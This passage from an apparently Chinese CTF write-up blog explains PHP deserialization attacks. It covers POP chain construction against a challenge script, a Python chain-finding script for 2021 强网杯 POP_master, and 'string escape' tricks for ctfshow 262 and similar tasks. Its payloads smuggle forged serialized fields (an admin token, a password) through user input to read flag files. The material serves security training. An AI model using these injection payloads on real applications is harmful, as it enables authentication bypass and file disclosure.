class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//hint is in hint.php</span><br>error_reporting(<span class="hljs-number">1</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;I think you need /etc/hint . Before this you need to see the source code&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_sayhello</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;name;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ok&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hi&#x27;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;_sayhello();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$cc</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;give you flag : &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;flag;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$phonenumber</span> = <span class="hljs-number">123123</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$promise</span> = <span class="hljs-string">&#x27;I do&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;promise = <span class="hljs-string">&#x27;I will not !!!!&#x27;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;promise;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;file[<span class="hljs-string">&#x27;filename&#x27;</span>]-&gt;ffiillee[<span class="hljs-string">&#x27;ffiilleennaammee&#x27;</span>];<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Room</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;/flag&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sth_to_set</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-keyword">$this</span>-&gt;a;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Get_hint</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$hint</span> = base64_encode(file_get_contents(<span class="hljs-variable">$file</span>));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$hint</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-keyword">$this</span>-&gt;Get_hint(<span class="hljs-keyword">$this</span>-&gt;filename);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hello&#x27;</span>])) &#123;<br>    unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hello&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$hi</span> = <span class="hljs-keyword">new</span> Start();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Start();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> Info();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> Room();<br><span class="hljs-variable">$c</span>-&gt;a = <span class="hljs-keyword">new</span> Room();<br><span class="hljs-variable">$b</span>-&gt;file[<span class="hljs-string">&#x27;filename&#x27;</span>] = <span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$a</span>-&gt;name = <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><h4 id="2021-强网杯-POP-master："><a href="#2021-强网杯-POP-master：" class="headerlink" title="2021 强网杯 POP_master："></a>2021 强网杯 POP_master：</h4><p><a href="https://raw.githubusercontent.com/ZimuWu/C/main/pop2.php">https://raw.githubusercontent.com/ZimuWu/C/main/pop2.php</a></p><p>脚本找链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> phply <span class="hljs-keyword">import</span> phplex<br><span class="hljs-keyword">from</span> phply.phpparse <span class="hljs-keyword">import</span> make_parser<br><span class="hljs-keyword">from</span> phply.phpast <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pprint<br><span class="hljs-keyword">import</span> nose<br><br>parser = make_parser()<br>func_name = <span class="hljs-string">&quot;find your func&quot;</span><br>con = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./qwb/class.php&quot;</span>).read()<br>lexer = phplex.lexer.clone()<br>lexer.filename = <span class="hljs-literal">None</span><br>output = parser.parse(con, lexer=lexer)<br>functions = &#123;&#125;<br>target = functions[func_name] i = <span class="hljs-number">0</span><br><span class="hljs-comment"># 强赋值函数直接跳过</span><br>skip_func = []<br>pop_chain = []<br>pop_chain.append(func_name) e = <span class="hljs-literal">False</span><br><span class="hljs-keyword">for</span> out <span class="hljs-keyword">in</span> output:<br>class_name = out.name<br><span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> out.nodes:<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(node) == Method):<br>functions[node.name] = out<br><span class="hljs-keyword">while</span>(e <span class="hljs-keyword">is</span> <span class="hljs-literal">False</span>):<br><span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> target.nodes:<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(node) == Method):<br><span class="hljs-keyword">if</span> node.name == func_name:<br><span class="hljs-keyword">for</span> subnode <span class="hljs-keyword">in</span> node.nodes:<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(subnode) == MethodCall:<br><span class="hljs-comment"># print(subnode)</span><br><span class="hljs-keyword">if</span>(subnode.name <span class="hljs-keyword">in</span> skip_func):<br><span class="hljs-keyword">continue</span><br>target = functions[subnode.name]<br>func_name = subnode.name<br>pop_chain.append(func_name)<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(subnode) == If):<br><span class="hljs-comment"># print(subnode)</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(subnode.node) == MethodCall :<br><span class="hljs-comment"># print(subnode.node.name)</span><br><span class="hljs-keyword">if</span>( subnode.node.name <span class="hljs-keyword">in</span> skip_func):<br><span class="hljs-keyword">continue</span><br>target = functions[subnode.node.name]<br>func_name = subnode.node.name<br>pop_chain.append(func_name)<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(subnode) == Eval):<br>e = <span class="hljs-literal">True</span><br><span class="hljs-keyword">for</span> pop <span class="hljs-keyword">in</span> pop_chain:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;class &quot;</span> + functions[pop].name + <span class="hljs-string">&quot;&#123;&quot;</span>)<br><span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> functions[pop].nodes:<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(node) == ClassVariables):<br><span class="hljs-keyword">for</span> subnode <span class="hljs-keyword">in</span> node.nodes:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;public &quot;</span> + subnode.name + <span class="hljs-string">&#x27;;&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;public function __construct()&#123;&quot;</span>)<br><span class="hljs-keyword">if</span> i+<span class="hljs-number">1</span> == <span class="hljs-built_in">len</span>(pop_chain):<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;$this-&gt;&quot;</span> + subnode.name[<span class="hljs-number">1</span>:] + <span class="hljs-string">&quot;= new &quot;</span> +<br>functions[pop_chain[i+<span class="hljs-number">1</span>]].name + <span class="hljs-string">&quot;();&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#125;&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#125;&quot;</span>)<br>i += <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> i == <span class="hljs-built_in">len</span>(pop_chain):<br><span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h2><p>PHP 在反序列化时，底层代码是以 <code>;</code> 作为字段的分隔，以 <code>&#125;</code> 作为结尾(字符串除外)，并且是根据长度判断内容的 ，同时反序列化的过程中必须严格按照序列化规则才能成功实现反序列化 。如下图，out!并不会被序列化</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210720135305824.png"></p><p>当某个属性的字符串长度不一致时也不会被序列化成功</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210720135505974.png"></p><h3 id="增多："><a href="#增多：" class="headerlink" title="增多："></a>增多：</h3><ul><li>ctfshow 262</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;from = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><span class="hljs-variable">$m</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>];<br><span class="hljs-variable">$t</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;t&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$f</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$m</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$t</span>))&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-keyword">new</span> message(<span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span>);<br>    <span class="hljs-variable">$umsg</span> = str_replace(<span class="hljs-string">&#x27;fuck&#x27;</span>, <span class="hljs-string">&#x27;loveU&#x27;</span>, serialize(<span class="hljs-variable">$msg</span>));<br>    setcookie(<span class="hljs-string">&#x27;msg&#x27;</span>,base64_encode(<span class="hljs-variable">$umsg</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your message has been sent&#x27;</span>;<br>&#125;<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>前面注释发现有个<code>message.php</code> ,访问：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;from = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$msg</span> = unserialize(base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]));<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$msg</span>-&gt;token==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload：</p><p>把 base64 编码后的结果放到 cookie 里面访问 message.php 就能拿到 flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;from = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> message(a,b,<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$umsg</span> = str_replace(<span class="hljs-string">&#x27;fuck&#x27;</span>, <span class="hljs-string">&#x27;loveU&#x27;</span>, serialize(<span class="hljs-variable">$c</span>));<br><span class="hljs-keyword">echo</span> base64_encode(<span class="hljs-variable">$umsg</span>);<br></code></pre></td></tr></table></figure><p>或者直接在 index.php 传值</p><blockquote><p>f=a&amp;m=b&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck”;s:5:”token”;s:5:”admin”;}</p></blockquote><p>访问 message.php</p><ul><li>某校的一题</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;secure&#x27;</span>, <span class="hljs-string">&#x27;secured&#x27;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;Marble&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;fucku&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$h</span> = <span class="hljs-keyword">new</span> Hacker();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-comment">//Security filtering</span><br>    <span class="hljs-variable">$h</span>-&gt;username = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$c</span> = unserialize(filter(serialize(<span class="hljs-variable">$h</span>)));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$c</span>-&gt;password === <span class="hljs-string">&#x27;hacker&#x27;</span>) &#123;<br>        var_dump(file_get_contents(<span class="hljs-string">&#x27;./flag.php&#x27;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题步骤：</p><p>首先得到序列化的字符串<code>O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;Marble&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;</code></p><p>截取需要逃逸的字符串<code>&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;</code></p><p>长度为 31，secure 全部替换为 secured，字符串+1，则需要<code>31</code>个 secure 把目标字符串顶出去</p><p>payload：</p><blockquote><p>username=securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure”;s:8:”password”;s:6:”hacker”;}&amp;password=</p></blockquote><p>题目改一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$a</span> = str_replace(<span class="hljs-string">&#x27;secure&#x27;</span>, <span class="hljs-string">&#x27;securing&#x27;</span>, <span class="hljs-variable">$str</span>);<br><br>    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;love&#x27;</span>, <span class="hljs-string">&#x27;lover&#x27;</span>, <span class="hljs-variable">$a</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;Marble&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;fucku&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$h</span> = <span class="hljs-keyword">new</span> Hacker();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-comment">//Security filtering</span><br>    <span class="hljs-variable">$h</span>-&gt;username = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$c</span> = unserialize(filter(serialize(<span class="hljs-variable">$h</span>)));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$c</span>-&gt;password === <span class="hljs-string">&#x27;hacker&#x27;</span>) &#123;<br>        var_dump(file_get_contents(<span class="hljs-string">&#x27;./flag.php&#x27;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可见此处 secure 变为了 secure，love 变为 lover</p><p>仍然要逃逸 31 个字符，当然可以 31 个 love，直接可以逃逸，但是也可以构造 15 个 secure 和一个 love</p><p>payload：</p><blockquote><p>username=securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecurelove”;s:8:”password”;s:6:”hacker”;}&amp;password=1</p></blockquote><h3 id="减少："><a href="#减少：" class="headerlink" title="减少："></a>减少：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$function</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br> <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br> <span class="hljs-variable">$filter</span> = <span 